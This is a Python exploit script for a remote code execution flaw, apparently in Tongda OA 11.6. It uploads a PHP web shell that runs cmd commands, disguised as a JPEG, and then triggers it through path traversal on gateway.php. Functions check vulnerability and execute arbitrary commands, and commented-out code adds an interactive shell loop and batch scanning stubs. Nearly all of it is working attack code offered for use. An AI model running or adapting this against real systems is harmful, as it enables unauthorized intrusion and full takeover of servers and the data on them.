import requests
import re
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)



def exp_check(url):

    try:
        url1 = url + '/ispirit/im/upload.php'
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate",
            "X-Forwarded-For": "127.0.0.1", "Connection": "close", "Upgrade-Insecure-Requests": "1",
            "Content-Type": "multipart/form-data; boundary=---------------------------27723940316706158781839860668"}
        data = "-----------------------------27723940316706158781839860668\r\nContent-Disposition: form-data; name=\"ATTACHMENT\"; filename=\"f.jpg\"\r\nContent-Type: image/jpeg\r\n\r\n<?php\r\n$command=$_POST['f'];\r\n$wsh = new COM('WScript.shell');\r\n$exec = $wsh->exec(\"cmd /c \".$command);\r\n$stdout = $exec->StdOut();\r\n$stroutput = $stdout->ReadAll();\r\necho $stroutput;\r\n?>\n\r\n-----------------------------27723940316706158781839860668\r\nContent-Disposition: form-data; name=\"P\"\r\n\r\n1\r\n-----------------------------27723940316706158781839860668\r\nContent-Disposition: form-data; name=\"DEST_UID\"\r\n\r\n1222222\r\n-----------------------------27723940316706158781839860668\r\nContent-Disposition: form-data; name=\"UPLOAD_MODE\"\r\n\r\n1\r\n-----------------------------27723940316706158781839860668--\r\n"
        result = requests.post(url1, headers=headers, data=data)
        name = "".join(re.findall("2003_(.+?)\|", result.text))
        url2 = url + '/ispirit/interface/gateway.php'
        url3 = url + '/mac/gateway.php'
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate",
            "X-Forwarded-For": "127.0.0.1", "Connection": "close", "Upgrade-Insecure-Requests": "1",
            "Content-Type": "application/x-www-form-urlencoded"}
        data = {"json": "{\"url\":\"../../../general/../attach/im/2003/%s.f.jpg\"}" % (name), "f": "echo fffhhh"}
        result2 = requests.post(url2, headers=headers, data=data)
        if result2.status_code == 200 and 'fffhhh' in result.text:
            # print("[+] Remote code execution vulnerability exists at the target address")
            return 1
        else:
            result3 = requests.post(url3,headers=headers, data=data)
            if result3.status_code == 200 and 'fffhhh' in result.text:
                return 1
        return 2
    except:
        return 3


def exp_cmd(url, cmd):
    try:
        url1 = url + '/ispirit/im/upload.php'
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate",
            "X-Forwarded-For": "127.0.0.1", "Connection": "close", "Upgrade-Insecure-Requests": "1",
            "Content-Type": "multipart/form-data; boundary=---------------------------27723940316706158781839860668"}
        data = "-----------------------------27723940316706158781839860668\r\nContent-Disposition: form-data; name=\"ATTACHMENT\"; filename=\"f.jpg\"\r\nContent-Type: image/jpeg\r\n\r\n<?php\r\n$command=$_POST['f'];\r\n$wsh = new COM('WScript.shell');\r\n$exec = $wsh->exec(\"cmd /c \".$command);\r\n$stdout = $exec->StdOut();\r\n$stroutput = $stdout->ReadAll();\r\necho $stroutput;\r\n?>\n\r\n-----------------------------27723940316706158781839860668\r\nContent-Disposition: form-data; name=\"P\"\r\n\r\n1\r\n-----------------------------27723940316706158781839860668\r\nContent-Disposition: form-data; name=\"DEST_UID\"\r\n\r\n1222222\r\n-----------------------------27723940316706158781839860668\r\nContent-Disposition: form-data; name=\"UPLOAD_MODE\"\r\n\r\n1\r\n-----------------------------27723940316706158781839860668--\r\n"
        result = requests.post(url1, headers=headers, data=data)
        name = "".join(re.findall("2003_(.+?)\|", result.text))
        url2 = url + '/ispirit/interface/gateway.php'
        url3 = url + '/mac/gateway.php'
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate",
            "X-Forwarded-For": "127.0.0.1", "Connection": "close", "Upgrade-Insecure-Requests": "1",
            "Content-Type": "application/x-www-form-urlencoded"}
        data = {"json": "{\"url\":\"../../../general/../attach/im/2003/%s.f.jpg\"}" % (name), "f": "{}".format(cmd)}
        result2 = requests.post(url2, headers=headers, data=data)
        if result2.status_code == 200:
            # print("[+] Remote code execution vulnerability exists at the target address")
            return result2.text
        else:
            result3 = requests.post(url3,headers=headers, data=data)
            if result3.status_code == 200:
                return result3.text
    except:
        return 3

# def exp_cmd(url, name, command="whoami"):
#     # if url[:4] != 'http':
#     #     url = 'http://' + url
#     # if url[-1] != '/':
#     #     url += '/'
#     url = url + '/ispirit/interface/gateway.php'
#     headers = {
#         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36",
#         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
#         "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate",
#         "X-Forwarded-For": "127.0.0.1", "Connection": "close", "Upgrade-Insecure-Requests": "1",
#         "Content-Type": "application/x-www-form-urlencoded"}
#     data = {"json": "{\"url\":\"../../../general/../attach/im/2003/%s.f.jpg\"}" % (name), "f": "%s" % command}
#     result = requests.post(url, headers=headers, data=data)
#     while (1):
#         command = input("fuhei@shell$ ")
#         if command == 'exit' or command == 'quit':
#             return 1
#             break
#         else:
#             data = {"json": "{\"url\":\"../../../general/../attach/im/2003/%s.f.jpg\"}" % (name), "f": "%s" % command}
#             result = requests.post(url, headers=headers, data=data)
#             print(result.text)
#             return 2




# if __name__ == '__main__':
#     url=input("输入URL:\n")
#     name=check(url)
#     if name:
#         console.print("[+] 通达oa 11.6 远程命令执行漏洞利用成功",style='bold bule')
#         command(ur
#     else:
#         console.print("[-] 通达oa 11.6 远程命令执行漏洞利用失败",style='bold red')


        #批量
    # url = sys.argv[1]
    # name = check(url)

if __name__ =='__main__':
    pass
